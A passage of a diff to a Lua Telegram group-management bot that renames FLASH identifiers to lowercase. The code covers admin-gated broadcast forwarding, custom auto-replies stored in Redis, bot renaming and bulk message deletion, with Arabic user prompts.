+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
 return false
 end 
-if FLASHdx1:get(FLASH.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
+if flashdx1:get(flash.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then   
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء امر الاذاعه ،", 1, 'md')
-FLASHdx1:del(FLASH.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء امر الاذاعه ،", 1, 'md')
+flashdx1:del(flash.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false  
 end 
-local list = FLASHdx1:smembers(FLASH..'bot:groups')   
+local list = flashdx1:smembers(flash..'bot:groups')   
 for k,v in pairs(list) do  
 tdcli_function({ID="ForwardMessages",
 chat_id_ = v,
@@ -8896,23 +8896,23 @@ message_ids_ = {[0] = msg.id_},
 disable_notification_ = 0,
 from_background_ = 1},function(a,t) end,nil) 
 end   
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم اذاعه رسالتك بالتوجيه \n❅∫ في ، ❨ "..#list.." ❩ مجموعه \n ", 1, 'md')
-FLASHdx1:del(FLASH.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم اذاعه رسالتك بالتوجيه \n❅∫ في ، ❨ "..#list.." ❩ مجموعه \n ", 1, 'md')
+flashdx1:del(flash.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه خاص بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
-FLASHdx1:setex(FLASH.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
-local FLASH = '❅∫ اهلا عزيزي ، '..renk_FLASH(msg)..'\n❅∫ ارسل الرساله الان لتوجيهها\nللخروج ارسل ،  ( الغاء ) \n '
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
+flashdx1:setex(flash.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
+local flash = '❅∫ اهلا عزيزي ، '..renk_flash(msg)..'\n❅∫ ارسل الرساله الان لتوجيهها\nللخروج ارسل ،  ( الغاء ) \n '
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
 return false
 end 
-if FLASHdx1:get(FLASH.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
+if flashdx1:get(flash.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then   
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء امر الاذاعه ،", 1, 'md')
-FLASHdx1:del(FLASH.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء امر الاذاعه ،", 1, 'md')
+flashdx1:del(flash.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false  
 end 
-local list = FLASHdx1:smembers(FLASH..'bot:userss')   
+local list = flashdx1:smembers(flash..'bot:userss')   
 for k,v in pairs(list) do  
 tdcli_function({ID="ForwardMessages",
 chat_id_ = v,
@@ -8921,213 +8921,213 @@ message_ids_ = {[0] = msg.id_},
 disable_notification_ = 0,
 from_background_ = 1},function(a,t) end,nil) 
 end   
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم اذاعه رسالتك بالتوجيه \n❅∫ الى ، ❨ "..#list.." ❩ مشترك \n ", 1, 'md')
-FLASHdx1:del(FLASH.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم اذاعه رسالتك بالتوجيه \n❅∫ الى ، ❨ "..#list.." ❩ مشترك \n ", 1, 'md')
+flashdx1:del(flash.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 end 
---     By Developer FLASH     --  
+--     By Developer flash     --  
 text = msg.content_.text_
-if msg.content_.text_ == 'حذف رد' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) or msg.content_.text_ == 'مسح رد' and  is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-FLASHdx1:set(FLASH..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','del_repgp1')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ حسننا ارسل الكلمة لحذفها " ,  1, "md")
+if msg.content_.text_ == 'حذف رد' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) or msg.content_.text_ == 'مسح رد' and  is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+flashdx1:set(flash..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','del_repgp1')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ حسننا ارسل الكلمة لحذفها " ,  1, "md")
 return false
 end
 if msg.content_.text_ then
-local content_text = FLASHdx1:get(FLASH..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
+local content_text = flashdx1:get(flash..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
 if content_text == 'del_repgp1' then
-FLASHdx(msg.chat_id_, msg.id_, 1,'❅∫ الكلمه ،*('..msg.content_.text_..')* تم حذفها ',  1, "md")
-FLASHdx1:del(FLASH..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
-FLASHdx1:del(FLASH..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')
-FLASHdx1:del(FLASH..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')
-FLASHdx1:del(FLASH..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')
-FLASHdx1:del(FLASH..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')
-FLASHdx1:del(FLASH..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'')
-FLASHdx1:del(FLASH..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')
-FLASHdx1:del(FLASH..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'')
-FLASHdx1:del(FLASH..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
-FLASHdx1:srem(FLASH..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
+flashdx(msg.chat_id_, msg.id_, 1,'❅∫ الكلمه ،*('..msg.content_.text_..')* تم حذفها ',  1, "md")
+flashdx1:del(flash..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
+flashdx1:del(flash..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')
+flashdx1:del(flash..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')
+flashdx1:del(flash..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')
+flashdx1:del(flash..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')
+flashdx1:del(flash..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'')
+flashdx1:del(flash..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')
+flashdx1:del(flash..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'')
+flashdx1:del(flash..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
+flashdx1:srem(flash..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
 return false end end
---     By Developer FLASH     -- 
-if msg.content_.text_ == 'اضف رد' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-FLASHdx1:set(FLASH..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','set_repgp')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ حسننا ارسل الكلمه الان " ,  1, "md")
+--     By Developer flash     -- 
+if msg.content_.text_ == 'اضف رد' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+flashdx1:set(flash..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','set_repgp')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ حسننا ارسل الكلمه الان " ,  1, "md")
 return false    end
 if msg.content_.text_ then
-local content_FLASHdx12 = FLASHdx1:get(FLASH..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
-if content_FLASHdx12 == 'set_repgp' then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الرد سواء كان : \n❅∫ ❨ ملف ، ملصق ، متحركه ، صوره\n ، فيديو ، بصمه ، صوت ، رساله ❩\n❅∫ يمكنك اضافه الى النص : \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- `#username`  معرف المستخدم\n- `#msgs`  عدد الرسائل\n- `#name`  اسم المستخدم\n- `#id`  ايدي المستخدم\n- `#stast`  رتبه المستخدم\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ للخروج ارسل  ( الغاء )\n " ,  1, "md")
-FLASHdx1:set(FLASH..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','save_repgp')
-FLASHdx1:set(FLASH..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
-FLASHdx1:sadd(FLASH..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
-FLASHdx1:set(FLASH..'delrep_owner'..msg.chat_id_..'',msg.content_.text_)
+local content_flashdx12 = flashdx1:get(flash..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
+if content_flashdx12 == 'set_repgp' then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الرد سواء كان : \n❅∫ ❨ ملف ، ملصق ، متحركه ، صوره\n ، فيديو ، بصمه ، صوت ، رساله ❩\n❅∫ يمكنك اضافه الى النص : \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- `#username`  معرف المستخدم\n- `#msgs`  عدد الرسائل\n- `#name`  اسم المستخدم\n- `#id`  ايدي المستخدم\n- `#stast`  رتبه المستخدم\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ للخروج ارسل  ( الغاء )\n " ,  1, "md")
+flashdx1:set(flash..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','save_repgp')
+flashdx1:set(flash..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
+flashdx1:sadd(flash..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
+flashdx1:set(flash..'delrep_owner'..msg.chat_id_..'',msg.content_.text_)
 return false
 end end
 text = msg.content_.text_
 if msg.content_.text_ == 'حذف رد عام' and is_sudo(msg) or msg.content_.text_ == 'مسح رد عام' and is_sudo(msg) or msg.content_.text_ == 'مسح رد للكل' and is_sudo(msg) then
-FLASHdx1:set(FLASH.."add:repallt"..msg.sender_user_id_,'del_rep1')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ حسننا ارسل الكلمة لحذفها " ,  1, "md")
+flashdx1:set(flash.."add:repallt"..msg.sender_user_id_,'del_rep1')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ حسننا ارسل الكلمة لحذفها " ,  1, "md")
 return false
 end
 if msg.content_.text_ then
-local content_text = FLASHdx1:get(FLASH.."add:repallt"..msg.sender_user_id_)
+local content_text = flashdx1:get(flash.."add:repallt"..msg.sender_user_id_)
 if content_text == 'del_rep1' then
-FLASHdx(msg.chat_id_, msg.id_, 1,'❅∫ الكلمه ،*('..msg.content_.text_..')* تم حذفها ',  1, "md")
-FLASHdx1:del(FLASH.."add:repallt"..msg.sender_user_id_)
-FLASHdx1:del(FLASH.."gif_repall"..msg.content_.text_)
-FLASHdx1:del(FLASH.."voice_repall"..msg.content_.text_)
-FLASHdx1:del(FLASH.."audio_repall"..msg.content_.text_)
-FLASHdx1:del(FLASH.."photo_repall"..msg.content_.text_)
-FLASHdx1:del(FLASH.."stecker_repall"..msg.content_.text_)
-FLASHdx1:del(FLASH.."video_repall"..msg.content_.text_)
-FLASHdx1:del(FLASH.."file_repall"..msg.content_.text_)
-FLASHdx1:del(FLASH.."text_repall"..msg.content_.text_)
-FLASHdx1:del(FLASH.."rep_sudo",msg.content_.text_)
+flashdx(msg.chat_id_, msg.id_, 1,'❅∫ الكلمه ،*('..msg.content_.text_..')* تم حذفها ',  1, "md")
+flashdx1:del(flash.."add:repallt"..msg.sender_user_id_)
+flashdx1:del(flash.."gif_repall"..msg.content_.text_)
+flashdx1:del(flash.."voice_repall"..msg.content_.text_)
+flashdx1:del(flash.."audio_repall"..msg.content_.text_)
+flashdx1:del(flash.."photo_repall"..msg.content_.text_)
+flashdx1:del(flash.."stecker_repall"..msg.content_.text_)
+flashdx1:del(flash.."video_repall"..msg.content_.text_)
+flashdx1:del(flash.."file_repall"..msg.content_.text_)
+flashdx1:del(flash.."text_repall"..msg.content_.text_)
+flashdx1:del(flash.."rep_sudo",msg.content_.text_)
 return false
 end end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.text_ == 'اضف رد عام' and is_sudo(msg) or msg.content_.text_ == 'اضف رد للكل' and is_sudo(msg)  then
-FLASHdx1:set(FLASH.."add:repallt"..msg.sender_user_id_,'set_rep')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ حسننا ارسل الكلمه الان " ,  1, "md")
+flashdx1:set(flash.."add:repallt"..msg.sender_user_id_,'set_rep')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ حسننا ارسل الكلمه الان " ,  1, "md")
 return false    end
 if msg.content_.text_ then
-local content_FLASHdx12 = FLASHdx1:get(FLASH.."add:repallt"..msg.sender_user_id_)
-if content_FLASHdx12 == 'set_rep' then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الرد سواء كان : \n❅∫ ❨ ملف ، ملصق ، متحركه ، صوره\n ، فيديو ، بصمه ، صوت ، رساله ❩\n❅∫ يمكنك اضافه الى النص : \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- `#username`  معرف المستخدم\n- `#msgs`  عدد الرسائل\n- `#name`  اسم المستخدم\n- `#id`  ايدي المستخدم\n- `#stast`  رتبه المستخدم\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ للخروج ارسل  ( الغاء )\n " ,  1, "md")
-FLASHdx1:set(FLASH.."add:repallt"..msg.sender_user_id_,'save_rep')
-FLASHdx1:set(FLASH.."addreply2:"..msg.sender_user_id_, msg.content_.text_)
-FLASHdx1:sadd(FLASH.."rep_sudo",msg.content_.text_)
-FLASHdx1:set(FLASH.."delrep_sudo",msg.content_.text_)
+local content_flashdx12 = flashdx1:get(flash.."add:repallt"..msg.sender_user_id_)
+if content_flashdx12 == 'set_rep' then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الرد سواء كان : \n❅∫ ❨ ملف ، ملصق ، متحركه ، صوره\n ، فيديو ، بصمه ، صوت ، رساله ❩\n❅∫ يمكنك اضافه الى النص : \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- `#username`  معرف المستخدم\n- `#msgs`  عدد الرسائل\n- `#name`  اسم المستخدم\n- `#id`  ايدي المستخدم\n- `#stast`  رتبه المستخدم\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ للخروج ارسل  ( الغاء )\n " ,  1, "md")
+flashdx1:set(flash.."add:repallt"..msg.sender_user_id_,'save_rep')
+flashdx1:set(flash.."addreply2:"..msg.sender_user_id_, msg.content_.text_)
+flashdx1:sadd(flash.."rep_sudo",msg.content_.text_)
+flashdx1:set(flash.."delrep_sudo",msg.content_.text_)
 return false 
 end end
---     By Developer FLASH     -- 
-if msg.content_.text_ == 'الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) or msg.content_.text_ == 'ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-local redod = FLASHdx1:smembers(FLASH..'rep_owner'..msg.chat_id_..'')
+--     By Developer flash     -- 
+if msg.content_.text_ == 'الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) or msg.content_.text_ == 'ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+local redod = flashdx1:smembers(flash..'rep_owner'..msg.chat_id_..'')
 if #redod == 0 then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا توجد ردود مضافه" ,  1, "md")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا توجد ردود مضافه" ,  1, "md")
 else
 msg_rep = "❅∫ ردود المدراء ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(redod) do
-if FLASHdx1:get(FLASH.."gif_repgp"..v..msg.chat_id_) then
+if flashdx1:get(flash.."gif_repgp"..v..msg.chat_id_) then
 dp = 'متحركه 🎭'
-elseif FLASHdx1:get(FLASH.."voice_repgp"..v..msg.chat_id_) then
+elseif flashdx1:get(flash.."voice_repgp"..v..msg.chat_id_) then
 dp = 'بصمه 🎙'
-elseif FLASHdx1:get(FLASH.."stecker_repgp"..v..msg.chat_id_) then
+elseif flashdx1:get(flash.."stecker_repgp"..v..msg.chat_id_) then
 dp = 'ملصق 🃏'
-elseif FLASHdx1:get(FLASH.."text_repgp"..v..msg.chat_id_) then
+elseif flashdx1:get(flash.."text_repgp"..v..msg.chat_id_) then
 dp = 'رساله ✉'
-elseif FLASHdx1:get(FLASH.."photo_repgp"..v..msg.chat_id_) then
+elseif flashdx1:get(flash.."photo_repgp"..v..msg.chat_id_) then
 dp = 'صوره 🎇'
-elseif FLASHdx1:get(FLASH.."video_repgp"..v..msg.chat_id_) then
+elseif flashdx1:get(flash.."video_repgp"..v..msg.chat_id_) then
 dp = 'فيديو 📽'
-elseif FLASHdx1:get(FLASH.."file_repgp"..v..msg.chat_id_) then
+elseif flashdx1:get(flash.."file_repgp"..v..msg.chat_id_) then
 dp = 'ملف 📁'
-elseif FLASHdx1:get(FLASH.."audio_repgp"..v..msg.chat_id_) then
+elseif flashdx1:get(flash.."audio_repgp"..v..msg.chat_id_) then
 dp = 'اغنيه 🎶'
 end
 msg_rep = msg_rep ..k..' - (*'..v..'*) « » (*'..dp..'*)\n' 
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, msg_rep,1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, msg_rep,1, 'md')
 end
 return false
 end
---     By Developer FLASH     -- 
-if msg.content_.text_ == 'حذف الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) or msg.content_.text_ == 'مسح الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) or msg.content_.text_ == 'حذف ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) or msg.content_.text_ == 'مسح ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-local redod = FLASHdx1:smembers(FLASH..'rep_owner'..msg.chat_id_..'')
+--     By Developer flash     -- 
+if msg.content_.text_ == 'حذف الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) or msg.content_.text_ == 'مسح الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) or msg.content_.text_ == 'حذف ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) or msg.content_.text_ == 'مسح ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+local redod = flashdx1:smembers(flash..'rep_owner'..msg.chat_id_..'')
 if #redod == 0 then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا توجد ردود مضافه" ,  1, "md")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا توجد ردود مضافه" ,  1, "md")
 else
 for k,v in pairs(redod) do
-FLASHdx1:del(FLASH..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
-FLASHdx1:del(FLASH..'gif_repgp'..v..msg.chat_id_)
-FLASHdx1:del(FLASH..'voice_repgp'..v..msg.chat_id_)
-FLASHdx1:del(FLASH..'audio_repgp'..v..msg.chat_id_)
-FLASHdx1:del(FLASH..'photo_repgp'..v..msg.chat_id_)
-FLASHdx1:del(FLASH..'stecker_repgp'..v..msg.chat_id_)
-FLASHdx1:del(FLASH..'video_repgp'..v..msg.chat_id_)
-FLASHdx1:del(FLASH..'file_repgp'..v..msg.chat_id_)
-FLASHdx1:del(FLASH..'text_repgp'..v..msg.chat_id_)
-FLASHdx1:del(FLASH..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
+flashdx1:del(flash..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
+flashdx1:del(flash..'gif_repgp'..v..msg.chat_id_)
+flashdx1:del(flash..'voice_repgp'..v..msg.chat_id_)
+flashdx1:del(flash..'audio_repgp'..v..msg.chat_id_)
+flashdx1:del(flash..'photo_repgp'..v..msg.chat_id_)
+flashdx1:del(flash..'stecker_repgp'..v..msg.chat_id_)
+flashdx1:del(flash..'video_repgp'..v..msg.chat_id_)
+flashdx1:del(flash..'file_repgp'..v..msg.chat_id_)
+flashdx1:del(flash..'text_repgp'..v..msg.chat_id_)
+flashdx1:del(flash..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
 end
-local FLASH = '❅∫ اهلا عزيزي ،  '..renk_FLASH(msg)..' \n❅∫ تم حذف ردود المدير\n'
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
+local flash = '❅∫ اهلا عزيزي ،  '..renk_flash(msg)..' \n❅∫ تم حذف ردود المدير\n'
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
 return false
 end end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if  msg.content_.text_ == "ردود المطور" and is_sudo(msg) or msg.content_.text_ == "الردود العام" and is_sudo(msg) or msg.content_.text_ == "ردود العام" and is_sudo(msg) then
-local redod = FLASHdx1:smembers(FLASH.."rep_sudo")
+local redod = flashdx1:smembers(flash.."rep_sudo")
 if #redod == 0 then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا توجد ردود مضافه" ,  1, "md")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا توجد ردود مضافه" ,  1, "md")
 else
 local i = 1
 msg_rep = "❅∫ ردود المطور ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(redod) do
-if FLASHdx1:get(FLASH.."gif_repall"..v) then
+if flashdx1:get(flash.."gif_repall"..v) then
 dp = 'متحركه 🎭'
-elseif FLASHdx1:get(FLASH.."voice_repall"..v) then
+elseif flashdx1:get(flash.."voice_repall"..v) then
 dp = 'بصمه 🎙'
-elseif FLASHdx1:get(FLASH.."stecker_repall"..v) then
+elseif flashdx1:get(flash.."stecker_repall"..v) then
 dp = 'ملصق 🃏'
-elseif FLASHdx1:get(FLASH.."text_repall"..v) then
+elseif flashdx1:get(flash.."text_repall"..v) then
 dp = 'رساله ✉'
-elseif FLASHdx1:get(FLASH.."photo_repall"..v) then
+elseif flashdx1:get(flash.."photo_repall"..v) then
 dp = 'صوره 🎇'
-elseif FLASHdx1:get(FLASH.."video_repall"..v) then
+elseif flashdx1:get(flash.."video_repall"..v) then
 dp = 'فيديو 📽'
-elseif FLASHdx1:get(FLASH.."file_repall"..v) then
+elseif flashdx1:get(flash.."file_repall"..v) then
 dp = 'ملف 📁'
-elseif FLASHdx1:get(FLASH.."audio_repall"..v) then
+elseif flashdx1:get(flash.."audio_repall"..v) then
 dp = 'اغنيه 🎶'
 end
 msg_rep = msg_rep ..k..' - (*'..v..'*) « » (*'..dp..'*)\n' 
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, msg_rep,1, "md")
+flashdx(msg.chat_id_, msg.id_, 1, msg_rep,1, "md")
 end
 return false
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.text_ == "حذف ردود المطور" and is_sudo(msg) or msg.content_.text_ == "حذف ردود العام" and is_sudo(msg) or msg.content_.text_ == "مسح ردود المطور" and is_sudo(msg) then
-local redod = FLASHdx1:smembers(FLASH.."rep_sudo")
+local redod = flashdx1:smembers(flash.."rep_sudo")
 if #redod == 0 then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا توجد ردود مضافه" ,  1, "md")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا توجد ردود مضافه" ,  1, "md")
 else
 for k,v in pairs(redod) do
-FLASHdx1:del(FLASH.."add:repallt"..v)
-FLASHdx1:del(FLASH.."gif_repall"..v)
-FLASHdx1:del(FLASH.."voice_repall"..v)
-FLASHdx1:del(FLASH.."audio_repall"..v)
-FLASHdx1:del(FLASH.."photo_repall"..v)
-FLASHdx1:del(FLASH.."stecker_repall"..v)
-FLASHdx1:del(FLASH.."video_repall"..v)
-FLASHdx1:del(FLASH.."file_repall"..v)
-FLASHdx1:del(FLASH.."text_repall"..v)
-FLASHdx1:del(FLASH.."rep_sudo",msg.content_.text_)
+flashdx1:del(flash.."add:repallt"..v)
+flashdx1:del(flash.."gif_repall"..v)
+flashdx1:del(flash.."voice_repall"..v)
+flashdx1:del(flash.."audio_repall"..v)
+flashdx1:del(flash.."photo_repall"..v)
+flashdx1:del(flash.."stecker_repall"..v)
+flashdx1:del(flash.."video_repall"..v)
+flashdx1:del(flash.."file_repall"..v)
+flashdx1:del(flash.."text_repall"..v)
+flashdx1:del(flash.."rep_sudo",msg.content_.text_)
 end
-local FLASH = '❅∫ اهلا عزيزي ،  '..renk_FLASH(msg)..' \n❅∫ تم حذف ردود المطور\n'
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
+local flash = '❅∫ اهلا عزيزي ،  '..renk_flash(msg)..' \n❅∫ تم حذف ردود المطور\n'
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
 return false
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^تغيير اسم البوت$") or text:match("^وضع اسم البوت$") then
 if not is_leader(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطور الاساسي فقط ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطور الاساسي فقط ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي اسم البوت الان ', 1, 'html')
-FLASHdx1:set('FLASH:'..bot_id..'namebot'..msg.sender_user_id_..'', 'msg')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي اسم البوت الان ', 1, 'html')
+flashdx1:set('flash:'..bot_id..'namebot'..msg.sender_user_id_..'', 'msg')
 return false 
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text == 'مسح اسم البوت' then
 if not is_leader(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطور الاساسي فقط ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطور الاساسي فقط ', 1, 'md')
 else
-FLASHdx1:del('FLASH:'..bot_id..'name_bot')
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حذف اسم البوت ', 1, 'html')
+flashdx1:del('flash:'..bot_id..'name_bot')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حذف اسم البوت ', 1, 'html')
 end end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text and text:match('^تنظيف (%d+)$') and FLASH11(msg) then    
+if text and text:match('^تنظيف (%d+)$') and flash11(msg) then    
 local Number = tonumber(text:match('^تنظيف (%d+)$')) 
 if Number > 1000 then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع تنظيف اكثر من 1000 رساله ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع تنظيف اكثر من 1000 رساله ', 1, 'md')
 return false  
 end  
 local Message = msg.id_
@@ -9135,12 +9135,12 @@ for i=1,tonumber(Number) do
 delete_msg(msg.chat_id_,{[0]=Message})
 Message = Message - 1048576 
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مسح * '..Number..'* رساله ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مسح * '..Number..'* رساله ', 1, 'md')
 end 
-if text and text:match('^مسح (%d+)$') and FLASH11(msg) then    
+if text and text:match('^مسح (%d+)$') and flash11(msg) then    
 local Number = tonumber(text:match('^مسح (%d+)$')) 
 if Number > 1000 then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع تنظيف اكثر من 1000 رساله ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع تنظيف اكثر من 1000 رساله ', 1, 'md')
 return false  
 end  
 local Message = msg.id_
@@ -9148,38 +9148,38 @@ for i=1,tonumber(Number) do
 delete_msg(msg.chat_id_,{[0]=Message})
 Message = Message - 1048576 
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مسح * '..Number..'* رساله ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مسح * '..Number..'* رساله ', 1, 'md')
 end end
---     By Developer FLASH     -- 
